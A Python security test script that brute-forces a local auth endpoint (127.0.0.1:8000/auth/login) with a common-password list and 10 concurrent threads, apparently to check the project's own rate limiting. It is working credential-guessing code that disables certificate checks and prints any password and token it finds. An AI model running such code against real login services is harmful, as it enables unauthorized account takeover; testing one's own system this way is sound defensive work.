#!/usr/bin/env python3
"""
Brute Force Attack Test
Test the auth module's protection against brute force attacks
"""
import requests
import time
import urllib3
from typing import List, Tuple, Optional
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# 禁用 SSL 警告（因为使用的是自签名证书）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target URL for testing
BASE_URL = "https://127.0.0.1:8000"

# 并发线程数（可以根据需要调整）
MAX_WORKERS = 10

def create_session_with_retry():
    """创建带有重试机制的 requests session"""
    session = requests.Session()
    
    # 禁用 SSL 验证（因为使用的是自签名证书）
    session.verify = False
    
    # 配置重试策略（减少重试次数以加快速度）
    retry_strategy = Retry(
        total=1,  # 只重试1次（减少重试以加快速度）
        backoff_factor=0.5,  # 重试间隔：0.5秒
        status_forcelist=[429, 500, 502, 503, 504],  # 这些状态码会触发重试
        allowed_methods=["POST", "GET"]  # 允许重试的方法
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def try_password(email: str, password: str, session: requests.Session) -> Optional[Tuple[str, str]]:
    """
    尝试单个密码
    
    Returns:
        (password, token) 如果成功，否则 None
    """
    try:
        response = session.post(
            f"{BASE_URL}/auth/login",
            json={
                "email": email,
                "password": password
            },
            timeout=5  # 减少超时时间以加快速度
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("ok") and data.get("token"):
                return (password, data.get("token"))
    except Exception:
        # 静默处理错误，加快速度
        pass
    
    return None

def brute_force_attack(email: str, password_list: List[str], use_concurrent: bool = True) -> Tuple[bool, str]:
    """
    Brute force attack test
    Attempt to brute force user account using password list
    
    Args:
        email: Target email address
        password_list: List of passwords to try
        use_concurrent: 是否使用并发攻击（默认True，速度更快）
        
    Returns:
        (success status, token if successful)
    """
    print(f"\n[Attack Test] Starting brute force attack - Target email: {email}")
    print(f"[Attack Test] Attempting {len(password_list)} passwords...")
    if use_concurrent:
        print(f"[Attack Test] Using concurrent mode with {MAX_WORKERS} workers...")
    
    start_time = time.time()
    success_count = 0
    failed_count = 0
    successful_password = None
    token = None
    
    if use_concurrent:
        # 并发攻击模式
        result_lock = threading.Lock()
        stop_flag = threading.Event()  # 用于快速停止所有任务
        completed = 0
        
        def worker(password: str):
            nonlocal successful_password, token, success_count, failed_count, completed
            
            # 如果已经找到密码或收到停止信号，直接返回
            if stop_flag.is_set() or successful_password:
                return None
            
            # 每个线程使用自己的 session
            session = create_session_with_retry()
            result = try_password(email, password, session)
            session.close()
            
            with result_lock:
                # 再次检查是否已经找到密码（避免重复处理）
                if stop_flag.is_set() or successful_password:
                    return None
                
                completed += 1
                if completed % 10 == 0:
                    print(f"[Progress] Attempted {completed}/{len(password_list)} passwords...")
                
                if result:
                    successful_password, token = result
                    success_count = 1
                    stop_flag.set()  # 设置停止标志
                    return result
                else:
                    failed_count += 1
            
            return None
        
        # 使用线程池并发执行
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(worker, pwd): pwd for pwd in password_list}
            
            for future in as_completed(futures):
                if stop_flag.is_set():
                    # 取消剩余任务
                    for f in futures:
                        f.cancel()
                    break
                try:
                    result = future.result(timeout=0.1)
                    if result:
                        break
                except Exception:
                    pass
    else:
        # 串行攻击模式（保留原逻辑作为备选）
        session = create_session_with_retry()
        
        for i, password in enumerate(password_list, 1):
            result = try_password(email, password, session)
            
            if result:
                successful_password, token = result
                success_count = 1
                break
            
            failed_count += 1
            if i % 10 == 0:
                print(f"[Progress] Attempted {i}/{len(password_list)} passwords...")
            
            # 最小延迟（几乎无延迟）
            time.sleep(0.01)
        
        session.close()
    
    elapsed_time = time.time() - start_time
    
    print(f"\n[Attack Results]")
    print(f"  - Success: {success_count}")
    print(f"  - Failed: {failed_count}")
    print(f"  - Time elapsed: {elapsed_time:.2f} seconds")
    print(f"  - Speed: {len(password_list)/elapsed_time:.2f} attempts/second")
    
    if successful_password:
        print(f"[✓] Attack successful! Password: {successful_password}")
        print(f"[✓] Token: {token[:20]}...")
        return True, token
    else:
        print("[✗] Attack failed - All password attempts failed")
        return False, None

def test_common_passwords():
    """Test common password list"""
    # Common weak passwords list
    common_passwords = [
        "123456",
        "password",
        "12345678",
        "123456789",
        "1234567890",
        "qwerty",
        "abc123",
        "password123",
        "admin",
        "letmein",
        "welcome",
        "monkey",
        "1234567",
        "sunshine",
        "princess",
        "dragon",
        "passw0rd",
        "master",
        "hello",
        "freedom",
        "whatever",
        "qazwsx",
        "trustno1",
        "654321",
        "jordan23",
        "harley",
        "password1",
        "shadow",
        "superman",
        "qwerty123",
        "michael",
        "football",
        "iloveyou",
        "123123",
        "admin123",
        "root",
        "toor",
        "test",
        "test123"
    ]
    
    # Test email - using test user from setup_test_user.py
    test_email = "test_student@example.com"
    
    success, token = brute_force_attack(test_email, common_passwords)
    
    if success:
        print("\n[Security Warning] System has brute force vulnerability!")
        print("Recommendation: Implement login rate limiting and account locking mechanism")
    else:
        print("\n[Security Test] Brute force attack failed (password not in list)")


if __name__ == "__main__":
    print("=" * 60)
    print("Auth Module - Brute Force Attack Test")
    print("=" * 60)
    
    test_common_passwords()
    
    print("\n" + "=" * 60)
    print("Test Completed")
    print("=" * 60)

